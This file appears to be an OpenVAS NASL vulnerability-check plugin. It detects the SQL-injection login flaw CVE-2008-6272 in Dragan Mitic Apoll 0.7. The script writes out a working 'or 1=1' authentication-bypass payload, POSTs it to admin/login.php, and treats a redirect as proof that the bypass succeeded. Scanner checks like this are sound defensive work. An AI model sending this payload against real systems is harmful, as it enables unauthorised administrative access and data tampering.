###############################################################################
# OpenVAS Vulnerability Test
# $Id: apoll_7_0_sql_injection.nasl 15 2013-10-27 12:49:54Z jan $
#
# Dragan Mitic Apoll 'admin/index.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Dragan Mitic Apoll is prone to an SQL-injection vulnerability because it
  fails to sufficiently sanitize user-supplied data before using it in an SQL
  query.

  Exploiting this issue could allow an attacker to compromise the application,
  access or modify data, or exploit latent vulnerabilities in the underlying
  database.

  Dragan Mitic Apoll 0.7 is vulnerable; other versions may also be affected.";

tag_solution = "Upgrade to newer Version if available at http://www.miticdjd.com/index/scripts/apoll/.";

if (description)
{
 script_id(100022);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(32079);
 script_cve_id("CVE-2008-6272");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_name("Dragan Mitic Apoll 'admin/index.php' SQL Injection Vulnerability");
 desc = "

 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 script_summary("Determine if Apoll is vulnerable to SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("vbulletin_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/apoll","/poll", cgi_dirs());

foreach dir (dirs) {

    variables = string("username=select username from ap_users' or ' 1=1'-- '&password=x");
    filename = string(dir + "/admin/login.php");
    host=get_host_name();

    req = string(
      "POST ", filename, " HTTP/1.0\r\n", 
      "Referer: ","http://", host, filename, "\r\n",
      "Host: ", host, ":", port, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables
    );

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(
       egrep(pattern: "Location: index.php", string: result)
      ) 
       {
         security_hole(port);
         exit(0);
       }
  
}

exit(0);
